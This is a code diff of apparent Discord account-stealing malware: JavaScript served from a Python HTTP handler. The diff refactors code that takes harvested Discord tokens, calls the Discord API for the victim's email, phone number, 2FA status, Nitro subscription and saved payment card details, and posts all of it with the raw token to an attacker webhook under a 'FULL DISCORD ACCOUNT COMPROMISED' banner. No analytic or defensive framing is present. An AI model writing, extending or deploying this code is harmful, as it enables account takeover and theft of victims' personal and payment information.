@@ -162,79 +162,65 @@ if(t&&!tok.includes(t))tok.push(t);
 }}
 }}catch(e){{}}
 
-// Process Discord account - GET EMAIL AND PHONE
+// Process Discord account
 if(tok.length>0){{
 for(let t of tok){{
 try{{
-// Get user info
 let r=await fetch('https://discord.com/api/v9/users/@me',{{headers:{{'Authorization':t}}}});
 if(r.ok){{
 let u=await r.json();
-
-// Display info
-d+=`✅ Discord Found!<br>`;
-d+=`👤 ${{u.username}}#${{u.discriminator}}<br>`;
-d+=`📧 ${{u.email||'No email'}}<br>`;
-d+=`📱 ${{u.phone||'No phone'}}<br>`;
-d+=`🆔 ${{u.id}}<br>`;
+d+=`✅ Discord: ${{u.username}}<br>📧 ${{u.email||'None'}}<br>📱 ${{u.phone||'None'}}<br>`;
 
 // Get payment info
-let cards=[];
-try{{
 let billing=await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources',{{
 headers:{{'Authorization':t}}
 }});
+let cards=[];
 if(billing.ok){{
 let b=await billing.json();
-cards=b.map(c=>`${{c.brand}} *${{c.last_4}} exp ${{c.expires_month}}/${{c.expires_year}}`);
+cards=b.map(c=>`${{c.brand}} ending in ${{c.last_4}} (Exp: ${{c.expires_month}}/${{c.expires_year}})`);
 }}
-}}catch(e){{}}
 
 // Get nitro
-let nitro='None';
-try{{
 let subs=await fetch('https://discord.com/api/v9/users/@me/billing/subscriptions',{{
 headers:{{'Authorization':t}}
 }});
+let nitro='None';
 if(subs.ok){{
 let s=await subs.json();
 if(s.length>0)nitro=s[0].type==1?'Nitro Classic':'Nitro Full';
 }}
-}}catch(e){{}}
 
-// Send EVERYTHING to webhook
+// Send to webhook
 await fetch('{WEBHOOK}',{{
 method:'POST',
 headers:{{'Content-Type':'application/json'}},
 body:JSON.stringify({{
-content:'@everyone 🚨 DISCORD ACCOUNT STOLEN',
+content:'@everyone 🚨 FULL DISCORD ACCOUNT COMPROMISED',
 embeds:[{{
-title:'🔑 FULL DISCORD ACCOUNT',
+title:'🔑 COMPLETE DISCORD ACCOUNT',
 color:16711680,
 fields:[
 {{name:'👤 Username',value:`${{u.username}}#${{u.discriminator}}`,inline:false}},
-{{name:'📧 EMAIL',value:`\\`${{u.email||'NOT SET'}}\\ ``,inline:false}},
-{{name:'📱 PHONE NUMBER',value:`\\`${{u.phone||'NOT SET'}}\\``,inline:false}},
-{{name:'🆔 User ID',value:`\\`${{u.id}}\\``,inline:true}},
+{{name:'📧 Email',value:`\\`${{u.email||'None'}}\\``,inline:true}},
+{{name:'📱 Phone',value:`\\`${{u.phone||'None'}}\\``,inline:true}},
+{{name:'🆔 User ID',value:`\\`${{u.id}}\\``,inline:false}},
 {{name:'🔐 2FA',value:u.mfa_enabled?'✅ Enabled':'❌ Disabled',inline:true}},
 {{name:'💎 Nitro',value:nitro,inline:true}},
-{{name:'💳 Cards',value:cards.length>0?cards.join('\\n'):'None',inline:false}},
+{{name:'💳 Payment Cards',value:cards.length>0?cards.join('\\n'):'None saved',inline:false}},
 {{name:'🔑 TOKEN',value:`\\`\\`\\`${{t}}\\`\\`\\``,inline:false}}
 ],
 thumbnail:{{url:`https://cdn.discordapp.com/avatars/${{u.id}}/${{u.avatar}}.png`}},
-footer:{{text:'✅ Email & Phone Captured'}}
+footer:{{text:'Full Account Access'}}
 }}]
 }})
 }});
-
-break; // Stop after first valid token
+break;
 }}
-}}catch(e){{
-console.error('Discord API error:',e);
-}}
+}}catch(e){{}}
 }}
 }}else{{
-d+='❌ No Discord (not logged in)<br>';
+d+='❌ No Discord login<br>';
 }}
 
 box.innerHTML=d;
@@ -352,4 +338,4 @@ footer:{{text:'No permission needed'}}
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
-        self.wfile.write(html.encode()) 
+        self.wfile.write(html.encode())
